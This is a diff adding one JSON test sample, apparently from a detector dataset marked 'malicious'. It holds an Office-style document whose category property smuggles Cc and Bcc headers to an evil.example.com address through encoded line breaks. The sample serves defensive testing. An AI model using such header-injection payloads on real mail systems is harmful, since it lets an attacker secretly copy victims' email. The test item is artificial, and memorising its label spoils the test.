@@ -1,0 +1,15 @@
+{
+  "schema_version": "1.0.0",
+  "id": "exp::email-webfetch::128::binary-variations::1",
+  "base_sample_id": "exp::email-webfetch::128",
+  "generator_id": "binary-variations",
+  "generator_version": "1.0.0",
+  "seed": -1806257378,
+  "content": "{\n  \"format\": \"office\",\n  \"coreProperties\": {\n    \"cp:category\": \"To: victim@target.example.com%0ACc:spy@evil.example.com%0ABcc:spy2@evil.example.com\\n\",\n    \"dc:creator\": \"John Doe\",\n    \"cp:lastModifiedBy\": \"Jane Smith\",\n    \"dcterms:created\": \"2026-01-15T10:30:00Z\"\n  }\n}",
+  "content_hash": "03bbd8451cdc8d21e3bb1609b76cc0ccb3f73960d6a6b932d2e78657b0e32aad",
+  "content_type": "text",
+  "expected_verdict": "malicious",
+  "expected_modules": [],
+  "variation_type": "binary:office-properties",
+  "difficulty": "advanced"
+}
